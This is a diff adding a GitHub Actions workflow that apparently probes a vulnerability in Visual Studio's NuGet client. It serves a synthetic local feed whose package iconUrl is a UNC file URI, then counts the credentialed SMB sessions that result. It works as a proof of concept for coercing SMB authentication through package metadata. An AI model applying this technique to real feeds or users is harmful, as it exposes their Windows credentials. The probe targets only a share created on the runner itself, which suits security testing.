@@ -1,0 +1,111 @@
+name: F034 NuGet icon UNC owned probe
+on:
+  push:
+    branches:
+      - f034-nuget-icon-unc-20261120
+permissions:
+  contents: read
+jobs:
+  probe:
+    runs-on: windows-2022
+    timeout-minutes: 15
+    strategy:
+      fail-fast: false
+      matrix:
+        repeat: [1, 2]
+    steps:
+      - name: Probe synthetic feed and owned SMB share
+        shell: powershell
+        run: |
+          $ErrorActionPreference = 'Stop'
+          Write-Host "F034_REPEAT=${{ matrix.repeat }}"
+          Write-Host "OS=$([Environment]::OSVersion.VersionString)"
+          $addr = Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notmatch '^(127|169\.254)\.' -and $_.InterfaceAlias -notmatch 'Loopback' } | Select-Object -First 1 -ExpandProperty IPAddress
+          if (-not $addr) { $addr = '127.0.0.1' }
+          Write-Host "OWNED_SMB_HOST_KIND=runner-ip"
+          $shareName = 'F034Icon'
+          $shareDir = Join-Path $env:RUNNER_TEMP 'f034-share'
+          New-Item -ItemType Directory -Force -Path $shareDir | Out-Null
+          $iconPath = Join-Path $shareDir 'icon.bin'
+          [IO.File]::WriteAllText($iconPath, 'F034-OWNED-ICON')
+          $feedDir = Join-Path $env:RUNNER_TEMP 'f034-feed'
+          New-Item -ItemType Directory -Force -Path $feedDir | Out-Null
+          $port = 18765
+          $uncUri = "file://$addr/$shareName/icon.bin"
+          $missingUri = "file://$addr/$shareName/missing.bin"
+          $feedIndex = @{ version='3.0.0'; resources=@(
+            @{ '@id'="http://127.0.0.1:$port/search"; '@type'='SearchQueryService/3.5.0' },
+            @{ '@id'="http://127.0.0.1:$port/flat/"; '@type'='PackageBaseAddress/3.0.0' },
+            @{ '@id'="http://127.0.0.1:$port/registration/"; '@type'='RegistrationsBaseUrl/3.6.0' }
+          ) } | ConvertTo-Json -Depth 8 -Compress
+          [IO.File]::WriteAllText((Join-Path $feedDir 'index.json'), $feedIndex)
+          $searchBody = @{ totalHits=1; data=@(
+            @{ id='F034.Owned.Icon'; version='1.0.0'; description='Owned synthetic icon probe'; authors='Owned'; iconUrl=$uncUri;
+              versions=@(@{ '@id'="http://127.0.0.1:$port/registration/f034.owned.icon/1.0.0.json"; version='1.0.0'; downloads=0 }) }
+          ) } | ConvertTo-Json -Depth 8 -Compress
+          [IO.File]::WriteAllText((Join-Path $feedDir 'search'), $searchBody)
+          $feedProc = $null
+          $shareCreated = $false
+          $uncStream = $null
+          try {
+            $py = (Get-Command python -ErrorAction Stop).Source
+            $feedProc = Start-Process -FilePath $py -ArgumentList @('-m','http.server',$port,'--bind','127.0.0.1','--directory',$feedDir) -PassThru -WindowStyle Hidden -RedirectStandardOutput (Join-Path $env:RUNNER_TEMP 'f034-feed-out.txt') -RedirectStandardError (Join-Path $env:RUNNER_TEMP 'f034-feed-err.txt')
+            Start-Sleep -Seconds 2
+            $feed = Invoke-RestMethod "http://127.0.0.1:$port/search?q=F034"
+            Write-Host "FEED_ICON_EQUALS_UNC=$($feed.data[0].iconUrl -eq $uncUri)"
+            Write-Host "DOTNET_VERSION=$(dotnet --version)"
+            $searchOutput = & dotnet package search F034 --source "http://127.0.0.1:$port/index.json" --take 1 2>&1
+            Write-Host "DOTNET_SEARCH_EXIT=$LASTEXITCODE"
+            Write-Host "DOTNET_SEARCH_FOUND_OWNED=$([bool]($searchOutput -match 'F034.Owned.Icon'))"
+            $principal = "$env:COMPUTERNAME\$env:USERNAME"
+            New-SmbShare -Name $shareName -Path $shareDir -FullAccess $principal | Out-Null
+            $shareCreated = $true
+            $vsRoot = Join-Path ${env:ProgramFiles} 'Microsoft Visual Studio\2022'
+            $dll = Get-ChildItem -Path $vsRoot -Recurse -File -Filter 'NuGet.PackageManagement.VisualStudio.dll' -ErrorAction SilentlyContinue | Select-Object -First 1
+            Write-Host "VS_NUGET_DLL_PRESENT=$([bool]$dll)"
+            if ($dll) {
+              Write-Host "VS_NUGET_DLL_VERSION=$($dll.VersionInfo.FileVersion)"
+              try {
+                $assembly = [Reflection.Assembly]::LoadFrom($dll.FullName)
+                $type = $assembly.GetType('NuGet.PackageManagement.VisualStudio.NuGetPackageFileService', $true)
+                $instance = [Runtime.Serialization.FormatterServices]::GetUninitializedObject($type)
+                $method = $type.GetMethod('GetStream', [Reflection.BindingFlags]'Instance,NonPublic')
+                if (-not $method) { throw 'GetStream absent' }
+                $localUri = New-Object System.Uri($iconPath)
+                $localTask = $method.Invoke($instance, [object[]]@($localUri))
+                $localStream = $localTask.GetAwaiter().GetResult()
+                Write-Host "LOCAL_FILE_STREAM=$([bool]$localStream)"
+                if ($localStream) { $localStream.Dispose() }
+                $before = @(Get-SmbSession)
+                $missTask = $method.Invoke($instance, [object[]]@([Uri]$missingUri))
+                $missStream = $missTask.GetAwaiter().GetResult()
+                Write-Host "MISSING_UNC_STREAM=$([bool]$missStream)"
+                if ($missStream) { $missStream.Dispose() }
+                $afterMissing = @(Get-SmbSession)
+                $uncTask = $method.Invoke($instance, [object[]]@([Uri]$uncUri))
+                $uncStream = $uncTask.GetAwaiter().GetResult()
+                Write-Host "EXISTING_UNC_STREAM=$([bool]$uncStream)"
+                if ($uncStream) {
+                  $buf = New-Object byte[] 15
+                  $n = $uncStream.Read($buf,0,$buf.Length)
+                  Write-Host "OWNED_MARKER_READ=$([Text.Encoding]::UTF8.GetString($buf,0,$n) -eq 'F034-OWNED-ICON')"
+                }
+                $sessions = @(Get-SmbSession)
+                $opens = @(Get-SmbOpenFile | Where-Object { $_.Path -like '*f034-share*icon.bin' })
+                $credentialed = @($sessions | Where-Object { $_.ClientUserName -and $_.ClientUserName -notmatch 'ANONYMOUS|GUEST' }).Count
+                Write-Host "SMB_SESSIONS_BEFORE=$($before.Count)"
+                Write-Host "SMB_SESSIONS_AFTER_MISSING=$($afterMissing.Count)"
+                Write-Host "SMB_SESSIONS_AFTER_EXISTING=$($sessions.Count)"
+                Write-Host "SMB_CREDENTIALED_SESSION_COUNT=$credentialed"
+                Write-Host "SMB_OPEN_OWNED_ICON_COUNT=$($opens.Count)"
+              } catch {
+                Write-Host "PRODUCT_METHOD_ERROR=$($_.Exception.GetType().FullName):$($_.Exception.Message)"
+              }
+            }
+            $nativeExists = [IO.File]::Exists(([Uri]$uncUri).LocalPath)
+            Write-Host "OS_UNC_FILE_EXISTS=$nativeExists"
+          } finally {
+            if ($uncStream) { $uncStream.Dispose() }
+            if ($shareCreated) { Remove-SmbShare -Name $shareName -Force -ErrorAction SilentlyContinue }
+            if ($feedProc) { Stop-Process -Id $feedProc.Id -Force -ErrorAction SilentlyContinue }
+          }
